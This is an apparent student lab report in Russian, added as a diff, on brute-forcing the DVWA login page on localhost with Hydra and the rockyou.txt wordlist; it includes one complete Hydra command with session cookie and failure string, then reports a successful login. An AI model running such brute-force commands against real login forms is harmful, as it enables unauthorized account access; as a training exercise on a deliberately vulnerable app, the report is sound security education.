@@ -1,0 +1,56 @@
+<h1 id="цель-работы">Цель работы</h1>
+<p>Цель работы — Приобретение практических навыков по использованию
+инструмента Hydra для брутфорса (подбора) паролей.</p>
+<h1 id="выполнение-этапа-индивидуального-проекта">Выполнение этапа
+индивидуального проекта</h1>
+<h2 id="steps-1-4">Steps 1-4</h2>
+<p>Подготовка к подбору паролей:</p>
+<figure>
+<img src="images/1.png" id="fig:001" style="width:70.0%"
+alt="Копирую архив в директорию Downloads и разархивирую его – файл с паролями" />
+<figcaption aria-hidden="true">Копирую архив в директорию Downloads и
+разархивирую его – файл с паролями</figcaption>
+</figure>
+<figure>
+<img src="images/2.png" id="fig:002" style="width:70.0%"
+alt="Запуск сервисов" />
+<figcaption aria-hidden="true">Запуск сервисов</figcaption>
+</figure>
+<figure>
+<img src="images/3.png" id="fig:003" style="width:70.0%"
+alt="Форма для брут-форса" />
+<figcaption aria-hidden="true">Форма для брут-форса</figcaption>
+</figure>
+<figure>
+<img src="images/4.png" id="fig:004" style="width:70.0%"
+alt="Фрагменты-cookie" />
+<figcaption aria-hidden="true">Фрагменты-cookie</figcaption>
+</figure>
+<h2 id="steps-5-6">Steps 5-6</h2>
+<p>Работа с Hydra, подбор пароля для учётной записи:</p>
+<pre><code>hydra -l admin -P ~/Downloads/rockyou.txt -s 80 localhost http-get-form &quot;/DVWA/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:H=Cookie:security=medium;PHPSESSID=of74bg222ffc6vigcsjfqbvhq7:F=Username and/or password incorrect.&quot;</code></pre>
+<figure>
+<img src="images/5.png" id="fig:005" style="width:70.0%"
+alt="Данные найдены" />
+<figcaption aria-hidden="true">Данные найдены</figcaption>
+</figure>
+<h2 id="step-7">Step 7</h2>
+<p>Настроила сервер apache2:</p>
+<p>Ввела данные в соответствующее поле. Операция прошла успешно:</p>
+<figure>
+<img src="images/6.png" id="fig:006" style="width:70.0%"
+alt="Успешная авторизация" />
+<figcaption aria-hidden="true">Успешная авторизация</figcaption>
+</figure>
+<h1 id="вывод">Вывод</h1>
+<p>Приобрела практический навык по использованию инструмента Hydra для
+брутфорса (подбора) паролей.</p>
+<h1 id="библиография">Библиография</h1>
+<ul>
+<li>https://github.com/digininja/DVWA?tab=readme-ov-file</li>
+<li>https://www.kali.org/</li>
+<li>https://spy-soft.net/rockyou-txt/</li>
+<li>https://losst.pro/kak-polzovatsya-hydra#perebor-parolya-autentifikcii-http</li>
+</ul>
+<h2 class="standout" id="section"></h2>
+<p>Спасибо за внимание!</p>
